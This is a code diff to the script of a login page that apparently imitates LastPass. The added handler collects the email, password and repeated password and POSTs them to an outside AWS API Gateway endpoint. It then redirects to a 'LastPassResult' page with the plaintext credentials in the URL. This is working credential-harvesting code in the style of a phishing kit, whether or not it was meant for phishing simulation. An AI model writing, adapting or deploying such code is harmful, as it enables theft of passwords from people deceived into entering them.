@@ -41,27 +41,30 @@
 			if (window.location.search) {
 				window.location.href = window.location.pathname;
 			}
-      document.getElementById('ajaxLogin').addEventListener('click', function() {
-        var form = new FormData(document.getElementById('login-form'));
-        fetch("", {
-          method: "POST",
-          body: form
-        });
-      });
+			document.getElementById('ajaxLogin').addEventListener('click', function () {
+				var email = document.getElementById('crEmail').value;
+				var password = document.getElementById('crPassword').value;
+				var repeatPassword = document.getElementById('crRepeatPassword').value;
+				fetch('https://jfha5on7o2.execute-api.us-east-1.amazonaws.com/live/login', {
+					cache: 'no-cache',
+					headers: {
+						'content-type': 'application/json'
+					},
+					method: 'POST',
+					mode: 'cors',
+					redirect: 'follow',
+					referrer: 'no-referrer',
+					body: JSON.stringify({
+						username: email,
+						password: password,
+						repeatPassword: repeatPassword
+					})
+				})
+					.then(function () {
+						window.location = "LastPassResult.html?crEmail=" + encodeURIComponent(email) + "&crPassword=" + encodeURIComponent(password) + "&crRepeatPassword=" + encodeURIComponent(repeatPassword);
+					});
+			});
 		};
-		/*
-		function submitall(){
-			var formFields = document.getElementsByTagName('input');
-			var outSearchString = "?";
-			for (var i = 0; i < formFields.length; i++) {
-				if(formFields[i].value != '' && formFields[i].id != ''){
-					outSearchString = outSearchString + formFields[i].id + "=" + formFields[i].value + '&';
-				}
-			}
-			window.location = "LastPassResult.html" + outSearchString;
-			return false;
-		}
-		*/
 		function populateall() {
 			var formFields = document.getElementsByTagName('input');
 			for (var i = 0; i < formFields.length; i++) {
